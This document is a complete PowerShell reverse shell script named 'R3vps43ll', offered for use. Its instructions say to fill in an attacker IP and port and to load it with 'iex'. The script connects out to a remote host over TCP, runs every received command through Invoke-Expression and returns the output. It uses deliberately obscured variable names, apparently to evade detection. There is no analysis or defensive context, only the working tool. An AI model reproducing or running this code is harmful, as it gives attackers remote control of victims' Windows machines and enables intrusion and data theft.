<# 
     R3vps43ll is a PowerShell reverse shell with limited capabilities.
     Remember to add your IP and Port below.
     Example usage in PowerShell: gc -raw r3vps43ll.txt | iex
#>
#Initialize your variables
$nogood = 0 - 0;
$CommLine = "PS ";
$endCL = "<r3vps43ll> ";
$wildCard = "*";
$listenHere = 31111; #Add your Port
$abode = "1.1.1.1"; #Add your IP Address
[byte[]]$d8taBights = 0..65535 | ForEach-Object {$nogood};

#Bring on the connection
$machina = New-Object System.Net.Sockets.TCPClient($abode,$listenHere);
$tributary = $machina.GetStream();

#If it is True run the DoWhile loop to bring the shell to life
if(!($entrance = $tributary.Read($d8taBights, $nogood, $d8taBights.Length)) -eq $nogood)
{
	Do
	{
		$entake = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($d8taBights,$nogood, $entrance);
		$around = (IEX (". {" + $entake + "} $wildCard>&1") | Out-STRING);
		$aroundthru = $around + $CommLine + (Get-Location).Path + $endCL;
		$aroundd8taBights = ([text.encoding]::ASCII).GetBytes($aroundthru);
		$tributary.Write($aroundd8taBights,$nogood,$aroundd8taBights.Length);
		[Console]::Out.Flush()
	}
	while(!($entrance = $tributary.Read($d8taBights, $nogood, $d8taBights.Length)) -eq $nogood)
}
exit
